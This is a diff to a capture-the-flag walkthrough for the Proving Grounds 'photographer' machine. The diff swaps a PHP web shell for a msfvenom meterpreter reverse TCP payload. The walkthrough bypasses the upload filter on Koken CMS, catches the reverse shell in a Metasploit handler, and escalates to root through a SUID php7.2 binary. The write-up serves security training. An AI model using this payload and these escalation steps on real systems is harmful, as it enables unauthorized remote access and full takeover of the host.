@@ -122,10 +122,109 @@ festus@boynamedboy:~/Desktop/CTF/Proving Grounds$
 - We have the email of the one who's website was built: **daisa@photographer.com** while the password from mailsent.txt
 as **babygirl**
 
-- Create a php file image.php.jpg (extension to trick server into uploading php file as image) with contents
+- Create a php reverse tcp shell with msfvenom:
 ```
-   <?php system($_GET['cmd']);?>
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.49.156 LPORT=4445 -f raw -o shell.php
 ```
+- Rename **image.php** to **image.php.jpg** to trick the UI into uploading the shell
+
+```
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.49.156
+set LPORT 4445
+exploit
+
+```
+
 - On Koken cms dashboard, import the image.
 - Intercept, request via burp and rename the uploading file from **image.php.jpg** to **image.php**, then upload the file.
 - On Koken cms library, select the file and put the mouse on "Download File" to see where file is hosted on server
+
+- Once uploaded, visit the site from user side and click on timeline to check recently uploaded images,
+then finally check in msfvenom if a session was created.
+- If done correctly, a session was created, type shell to gain a shell;
+
+```
+meterpreter>
+meterpreter>shell
+```
+- system runs python3, so we can spawn a shell:
+```
+meterpreter>shell
+ls
+which python3
+/usr/bin/python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$
+```
+- We can finally exploit it:
+```
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls
+ls
+image.php
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls /home/daima
+<www/html/koken/storage/originals/69/fa$ ls /home/daima                      
+ls: cannot access '/home/daima': No such file or directory
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ cd
+cd
+bash: cd: HOME not set
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls /home
+ls /home
+agi  daisa  lost+found
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls /home/daisa
+<www/html/koken/storage/originals/69/fa$ ls /home/daisa                      
+Desktop    Downloads  Pictures	Templates  examples.desktop  user.txt
+Documents  Music      Public	Videos	   local.txt
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ cat /home/daisa/user.txt
+<www/html/koken/storage/originals/69/fa$ cat /home/daisa/user.txt            
+This is not the flag you're looking for...
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ cat /home/daisa/local.txt
+<www/html/koken/storage/originals/69/fa$ cat /home/daisa/local.txt           
+58b12beadc9f84725fa834bfaf8b029b
+```
+- Trying to view home directory pops nothing, so we check for files with suid bits set and we find php7.2 is among them from which we use it to priv escalate
+```
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ find / -perm -u=s -type f 2>/dev/null
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/php7.2
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+```
+- We then use php7.2 to priv escalate:
+```
+www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
+<ginals/69/fa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"         
+bash-4.3# whoami
+whoami
+root
+bash-4.3# whoami
+whoami
+root
+bash-4.3# ls /root
+ls /root
+proof.txt
+bash-4.3# cat /root/proof.txt
+cat /root/proof.txt
+0ecf43ae4a8d2bf476944a10cac070ee
+bash-4.3#
+```
